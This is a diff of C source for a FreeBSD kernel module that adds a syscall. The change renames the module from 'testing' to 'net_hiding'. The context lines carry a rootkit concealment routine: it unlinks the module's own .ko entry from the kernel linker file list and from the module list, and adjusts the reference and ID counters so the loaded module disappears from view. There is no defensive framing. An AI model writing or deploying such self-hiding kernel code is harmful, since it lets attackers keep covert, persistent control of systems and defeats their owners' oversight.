@@ -16,7 +16,7 @@
 #include <sys/mutex.h>
 
 /* function prototypes (MOVE TO HEADER) */
-static int testing(struct thread *, void *);
+static int net_hiding(struct thread *, void *);
 static void print_status(void);
 
 typedef TAILQ_HEAD(, module) modulelist_t;
@@ -39,7 +39,7 @@ struct module {
 	modspecific_t data;
 };
 
-char string[] = "Testing module.";
+char string[] = "net_hiding module.";
 
 /* this is only to show that the extern functions are working */
 static void print_status() {
@@ -47,16 +47,16 @@ static void print_status() {
 }
 
 /* This function only checks that the module is still working. */
-static int testing(struct thread *t, void *arg) {
+static int net_hiding(struct thread *t, void *arg) {
 	uprintf("SYSCALL was ESTABLISHED and is still in memory.\n");
 	print_status();
 	return 0;
 }
 
 /* The 'sysent' for the new syscall */
-static struct sysent testing_sysent = {
+static struct sysent net_hiding_sysent = {
 	0,		/* sy_narg */
-	testing /* sy_call */
+	net_hiding /* sy_call */
 };
 
 /* The offset in sysent where the syscall is allocated. */
@@ -82,7 +82,7 @@ static int event_handler(struct module *module, int event, void *arg) {
 
 			(&linker_files)->tqh_first->refs--;
 			for (lf = (&linker_files)->tqh_first; lf; lf = (lf)->link.tqe_next) {
-				if (!strcmp(lf->filename, "testing.ko")) {
+				if (!strcmp(lf->filename, "net_hiding.ko")) {
 					next_file_id--; /* decrement the global link file counter */
 
 					/* remove the entry */
@@ -100,7 +100,7 @@ static int event_handler(struct module *module, int event, void *arg) {
 			/* lockmgr(&lock_t, LK_RELEASE, &m); */
 
 			for (mod = TAILQ_FIRST(&modules); mod; mod = TAILQ_NEXT(mod, link)) {
-				if (!strcmp(mod->name, "testing")) {
+				if (!strcmp(mod->name, "net_hiding")) {
 					/* patch the internel ID counter */
 					nextid--;
 
@@ -120,4 +120,4 @@ static int event_handler(struct module *module, int event, void *arg) {
 	return(e);
 }
 
-SYSCALL_MODULE(testing, &offset, &testing_sysent, event_handler, NULL);
+SYSCALL_MODULE(net_hiding, &offset, &net_hiding_sysent, event_handler, NULL);
